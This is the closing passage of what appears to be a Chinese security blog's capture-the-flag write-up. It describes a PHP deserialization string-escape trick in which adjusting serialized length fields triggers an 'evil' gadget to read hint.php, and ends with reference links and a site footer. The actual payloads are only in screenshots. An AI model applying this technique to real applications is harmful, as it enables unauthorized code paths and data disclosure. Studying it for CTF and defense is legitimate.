+<img src=/img/post/16258114498309.jpg alt></p><p>从上图可以看出，输入的字符串被替换为了 123123，但是显示的长度还是 12，位数不对时反序列化就会出错</p><p>我们需要把位置 1 的数字和位置 2 的字符串的位数设置为相同，这样反序列化不会出错且位置 3 还会触发 evil</p><p>具体如下，可触发 evil 得到 hint.php 中的内容：
+<img src=/img/post/16258119470950.jpg alt></p><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=https://blog.csdn.net/qq_25755011/article/details/115950424?_blank>https://blog.csdn.net/qq_25755011/article/details/115950424</a></li><li><a href=https://www.cnblogs.com/tr1ple/p/11876441.html?_blank>https://www.cnblogs.com/tr1ple/p/11876441.html</a></li><li><a href=https://cloud.tencent.com/developer/article/1627299?_blank>https://cloud.tencent.com/developer/article/1627299</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
